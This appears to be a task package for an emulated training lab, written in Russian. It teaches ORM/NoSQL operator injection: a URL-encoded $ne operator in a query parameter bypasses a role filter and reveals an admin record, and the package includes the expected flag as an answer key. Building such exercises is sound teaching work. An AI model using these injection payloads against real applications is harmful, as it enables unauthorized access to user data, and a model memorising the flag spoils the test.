@@ -1,0 +1,37 @@
+{
+  "id": "web-orm-leaks",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{0rm_0p3r4t0r_l34k_byp4ss}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: ORM-инъекция\n\nGET /users?role= фильтрует через Sequelize. Обойди фильтр и найди админа.\n\n1. Обычный фильтр:\n   curl -s 'https://app.target/users?role=user'\n2. Оператор $ne (квадратные скобки и $ URL-кодируем как %5B и %24):\n   curl -s 'https://app.target/users?role%5B%24ne%5D=x'\n3. В выдаче будет админ с флагом — запиши его в found.txt и набери check.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.target/users)",
+      "cases": [
+        {
+          "match": "%24ne|ne%5D|%24gt|%24regex",
+          "example": "-s '.../users?role%5B%24ne%5D=x'",
+          "output": "[{\"name\":\"admin\",\"role\":\"admin\",\"secret\":\"nto{0rm_0p3r4t0r_l34k_byp4ss}\"}]\n"
+        },
+        {
+          "match": "users",
+          "example": "-s '.../users?role=user'",
+          "output": "[{\"name\":\"bob\",\"role\":\"user\"}]\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /users на app.target.\n"
+    }
+  }
+}
